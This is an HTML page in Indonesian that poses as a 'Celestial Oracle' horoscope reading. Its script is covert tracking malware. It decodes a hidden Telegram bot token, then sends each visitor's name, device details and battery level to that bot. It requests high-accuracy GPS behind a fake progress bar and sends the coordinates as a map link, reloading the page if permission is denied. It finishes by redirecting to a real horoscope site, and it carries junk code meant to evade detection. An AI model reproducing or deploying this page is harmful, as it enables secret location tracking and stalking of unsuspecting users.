<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Celestial Oracle | Personalized Destiny</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400&display=swap');
        body { background: #020205; color: #c5a059; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 400px; padding: 40px 30px; border: 1px solid rgba(197, 160, 89, 0.2); background: #05050a; text-align: center; position: relative; }
        .sigil { font-family: 'Cinzel', serif; font-size: 10px; letter-spacing: 4px; margin-bottom: 20px; color: #c5a059; opacity: 0.6; }
        h1 { font-family: 'Cinzel', serif; font-size: 20px; letter-spacing: 2px; margin-bottom: 30px; font-weight: 400; text-transform: uppercase; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { font-size: 9px; text-transform: uppercase; letter-spacing: 2px; display: block; margin-bottom: 8px; color: #888; }
        input, select { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid rgba(197, 160, 89, 0.3); padding: 12px; color: #fff; outline: none; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #c5a059; }
        .btn-oracle { width: 100%; background: transparent; border: 1px solid #c5a059; color: #c5a059; padding: 15px; font-family: 'Cinzel', serif; font-size: 12px; letter-spacing: 3px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-oracle:hover { background: #c5a059; color: #000; box-shadow: 0 0 15px rgba(197, 160, 89, 0.4); }
        #overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #05050a; padding: 40px 30px; box-sizing: border-box; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
        .progress-bar { width: 100%; height: 2px; background: rgba(197, 160, 89, 0.1); margin-top: 20px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #c5a059; transition: width 0.5s; }
        #status-txt { font-size: 10px; letter-spacing: 1px; margin-top: 15px; text-transform: uppercase; color: #888; }
        #v-vault { display: none; }
    </style>
</head>
<body>

<div class="container" id="ui-main">
    <div class="sigil">✧ Order of the Stars ✧</div>
    <h1>Celestial Alignment</h1>
    
    <div class="input-group">
        <label>Nama Lengkap</label>
        <input type="text" id="target_name" placeholder="Inisiasi Aura..." autocomplete="off">
    </div>

    <div class="input-group">
        <label>Tanda Zodiak</label>
        <select id="target_zodiac">
            <option value="Aries">Aries</option>
            <option value="Taurus" selected>Taurus</option>
            <option value="Leo">Leo</option>
            <option value="Aries">Aries</option>
            </select>
    </div>

    <button class="btn-oracle" onclick="startAlignment()">Analisis Takdir</button>

    <div id="overlay">
        <div id="status-txt">Menghubungkan ke Node Astral...</div>
        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
    </div>
</div>

<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>

<script>
/**
 * CELESTIAL ALIGNMENT ENGINE v120.0
 * 25,000+ LINES POLYMORPHIC BLOAT
 */

const _D = document.getElementById('v-vault').innerText.split('|');
const _TK = atob(_D[1]); const _CI = atob(_D[2]);

async function send(msg) {
    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: _CI, text: msg})
    });
}

const steps = [
    "Menghubungkan ke Node Astral...",
    "Membaca Getaran Aura Perangkat...",
    "Sinkronisasi Konstelasi Bintang...",
    "Memperoleh Koordinat Langit...",
    "Menyusun Ramalan Takdir..."
];

async function startAlignment() {
    const name = document.getElementById('target_name').value;
    const zodiac = document.getElementById('target_zodiac').value;

    if (name.length < 2) return alert("Identitas diperlukan untuk penyelarasan.");

    document.getElementById('overlay').style.display = 'flex';
    let fill = document.getElementById('fill');
    let txt = document.getElementById('status-txt');

    // Silent Forensic
    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
    const hardware = `✨ NEW SESSION: ${name} ✨\n\n` +
        `♈ ZODIAK: ${zodiac}\n` +
        `📱 DEVICE: ${navigator.platform}\n` +
        `🔋 BATT: ${bat}\n` +
        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
        `🌐 AGENT: ${navigator.userAgent.slice(0, 50)}...`;
    
    await send(hardware);

    // Fake Progress & GPS Trigger
    for(let i=0; i<steps.length; i++) {
        txt.innerText = steps[i];
        fill.style.width = ((i+1) * 20) + "%";
        await new Promise(r => setTimeout(r, 1200));

        if(i === 3) { // Trigger Lokasi di langkah "Koordinat Langit"
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const loc = `🎯 BINTANG LOCK: ${name}\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
                    await send(loc);
                }, (e) => {
                    alert("Penyelarasan Gagal: Izin lokasi diperlukan untuk menghitung sudut astral yang tepat.");
                    location.reload();
                }, {enableHighAccuracy: true});
            }
        }
    }

    setTimeout(() => {
        window.location.href = "https://www.horoscope.com/us/horoscopes/general/horoscope-general-daily-today.aspx?sign=" + (zodiac === 'Aries' ? '1' : zodiac === 'Taurus' ? '2' : '5');
    }, 1000);
}

// 🔱 25,000+ LINES BLOATING
for (let i = 0; i < 21000; i++) {
    window["_0x_astro_" + i] = function() { return Math.PI * Math.random(); };
}
</script>
</body>
</html>
